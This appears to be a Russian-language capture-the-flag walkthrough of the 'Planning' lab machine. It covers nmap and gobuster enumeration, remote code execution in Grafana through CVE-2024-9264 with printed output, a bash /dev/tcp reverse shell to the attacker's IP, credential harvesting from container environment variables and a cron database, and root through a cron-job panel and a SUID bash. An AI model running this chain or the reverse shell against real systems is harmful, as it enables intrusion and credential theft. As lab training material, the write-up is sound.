Сначало я проверя цель nmap:

```bash
nmap -sC -sV -Pn -p- 10.129.237.241
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 03:35 CDT
Nmap scan report for 10.129.237.241
Host is up (0.078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.97 seconds
```

Вижу стандартные открытые порты, вписываю ip в hosts файл и смотрю цель. Зацепится пока не за что, nginx не уязвим.

Дальше я решаю проверить наличие дирикторий с помощю gobuster:

```bash
gobuster dir -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/index.php            (Status: 200) [Size: 23914]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

Ничего, тогда нужно посмотреть сабдомены:

```bash
```

Нахожу Grafana, креды у меня есть, они были в описании CTF

Изучаю графану ничего интересного, проверяю версию:

Grafana v11.0.0 (83b9528bce)

![grafana version](image.png)

По данной версии есть уязвимость: https://github.com/nollium/CVE-2024-9264

Работает

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c id  http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

Судя по всему мы root, но мы получим shell

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c 'bash -c "bash -i >& /dev/tcp/10.10.14.129/4444 0>&1"'  http://grafana.planning.htb

```bash
nc -lvnp 4444 -s 10.10.14.129
listening on [10.10.14.129] 4444 ...
connect to [10.10.14.129] from (UNKNOWN) [10.129.221.122] 48752
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# ls
ls
LICENSE
bin
conf
public
root@7ce659d667d7:~# cd /root
```

Все указывает на то, что мы в докер контенере:

```bash
root@7ce659d667d7:/home/grafana# ls -la /.dockerenv
ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Apr  4 10:23 /.dockerenv
root@7ce659d667d7:/home/grafana# ip -c a
ip -c a
bash: ip: command not found
root@7ce659d667d7:/home/grafana# ifconfig
ifconfig
bash: ifconfig: command not found
root@7ce659d667d7:/home/grafana# cat /proc/1/cgroup
cat /proc/1/cgroup
0::/
root@7ce659d667d7:/home/grafana# ps -p 1 -o comm=
ps -p 1 -o comm=
grafana
root@7ce659d667d7:/home/grafana#
```

Далее я загрузил с помощю python сервера linpeas.sh в окнтейнер:

```bash
Any private information inside environment variables?
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=./linpeas.sh
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

![linpeas_output](image-1.png)

Я получил юзера и пароль, можно попробовать залогинится с этими кредами по ssh:

```bash
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
enzo@planning:~$
```

Готово, получаем юзер флаг и идем дальше к привышению привилегий:

```bash
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
enzo@planning:~$
```

sudo -l показывает, что у юзера нету прав использовать sudo

Можно загрузить сюда linpeas.sh, но я хочу пойти более простым путем, а именно, обычно если sudo не работает, то следует посмотреть порты, может на хосте что интересное бежит и через него можно будет достучатся к root.

```bash
enzo@planning:~$ ss -tulpn
Netid      State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port      Process      
udp        UNCONN      0           0                   127.0.0.54:53                   0.0.0.0:*                      
udp        UNCONN      0           0                127.0.0.53%lo:53                   0.0.0.0:*                      
udp        UNCONN      0           0                      0.0.0.0:68                   0.0.0.0:*                      
tcp        LISTEN      0           151                  127.0.0.1:3306                 0.0.0.0:*                      
tcp        LISTEN      0           4096                127.0.0.54:53                   0.0.0.0:*                      
tcp        LISTEN      0           70                   127.0.0.1:33060                0.0.0.0:*                      
tcp        LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*                      
tcp        LISTEN      0           4096                 127.0.0.1:46027                0.0.0.0:*                      
tcp        LISTEN      0           4096                 127.0.0.1:3000                 0.0.0.0:*                      
tcp        LISTEN      0           511                  127.0.0.1:8000                 0.0.0.0:*                      
tcp        LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*                      
tcp        LISTEN      0           4096                         *:22                         *:*                      
enzo@planning:~$
```

Что бы упростить себе задачу, я спрошу у chatgpt:

```text
Що видно з ss -tulpn

:22 (SSH) – стандартно, навряд чи напряму допоможе, але якщо знайдеш пароль/ключ від root – можна увійти.
:80 (HTTP) – вебсервіс, але він і так, мабуть, основний вхід (Grafana чи щось інше).
127.0.0.1:3000 – типовий порт Grafana. Ти вже експлуатував його.
127.0.0.1:8000 – кастомний веб-сервіс, який не видно зовні, але ти можеш до нього достукатись зсередини. Часто в CTF він і є “ключем” до підвищення привілеїв.
127.0.0.1:3306 / 33060 – MySQL/MariaDB. Якщо в тебе є креденшали (наприклад, у Grafana-конфігах), можна спробувати підключитися і пошукати root-паролі, хеші або прапори.
127.0.0.54:53 / 127.0.0.53:53 – це локальні DNS-resolver-и systemd-resolved, не дуже цікаво.
127.0.0.1:46027 – щось тимчасове, можливо сокет сервісу або локальний бекенд. Може виявитися API для чогось.
```
Давай попробуем 8000

Я сделал порт форвард:

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```

Но тут форма для логинга:

![alt text](image-2.png)

Думаю где то должны быть креды

Я нашел это:

```bash
enzo@planning:~$ ls /opt/crontabs
crontab.db
enzo@planning:~$ cat /opt/crontabs/crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
enzo@planning:~$
```

Юзер root.

![alt text](image-3.png)

Это какая то админка для запуска cron джоб. Отличная точка входа к повышению привилегий.

![alt text](image-5.png)

Готово:

```bash
enzo@planning:/tmp$ ls 
bash
bashroot
QbdQ8MX0xIotetcb.stderr
QbdQ8MX0xIotetcb.stdout
systemd-private-a7a428e3fd624e3fb96baece32303215-fwupd.service-QHxDNe
systemd-private-a7a428e3fd624e3fb96baece32303215-ModemManager.service-ScLGhb
systemd-private-a7a428e3fd624e3fb96baece32303215-polkit.service-mUwBAL
systemd-private-a7a428e3fd624e3fb96baece32303215-systemd-logind.service-H8gCrg
systemd-private-a7a428e3fd624e3fb96baece32303215-systemd-resolved.service-vGjQnb
systemd-private-a7a428e3fd624e3fb96baece32303215-systemd-timesyncd.service-ybqNPN
systemd-private-a7a428e3fd624e3fb96baece32303215-upower.service-SdEYyH
vmware-root_824-2999002073
YvZsUUfEXayH6lLj.stderr
YvZsUUfEXayH6lLj.stdout
enzo@planning:/tmp$ /tmp/bashroot -p
bashroot-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
bashroot-5.2#
```
